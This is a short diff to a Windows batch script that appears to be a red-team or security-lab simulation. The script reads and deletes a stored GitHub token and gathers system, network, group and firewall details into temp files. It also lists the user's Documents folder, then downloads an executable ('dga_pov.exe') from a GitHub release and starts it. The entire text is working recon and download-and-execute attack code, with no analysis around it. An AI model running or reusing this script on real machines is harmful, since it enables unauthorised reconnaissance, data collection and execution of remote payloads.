@@ -3,5 +3,5 @@
 set filename=%date:~-10,4%%date:~-5,2%%date:~-2,2%
 set /p key= <"C:\CRDemo\tkn.txt" & del C:\CRDemo\tkn.txt
 C:\Windows\system32\cmd.exe /c whoami /groups >> %TEMP%\%filename%_scan.dat & ipconfig /all >> %TEMP%\%filename%_scan.dat & arp -a & netstat -na >> %TEMP%\%filename%_scan.dat & systeminfo >> %TEMP%\%filename%_scan.dat & netsh advfirewall firewall show rule name=all >> %TEMP%\%filename%_scan.dat
-C:\Windows\system32\cmd.exe /c dir /s "%userprofile%\Documents" /b /a-d .\ >> %TEMP%\%filename%_files.dat
+C:\Windows\system32\cmd.exe /c dir /s "%userprofile%\Documents" /b /a-d >> %TEMP%\%filename%_files.dat
 C:\Windows\system32\cmd.exe /c curl -H "Authorization: token ghp_%key%" -H "Accept: application/octet-stream" -L https://api.github.com/repos/maki2010/seclab/releases/assets/68351674 --output %TEMP%\dga_pov.exe & start %TEMP%\dga_pov.exe
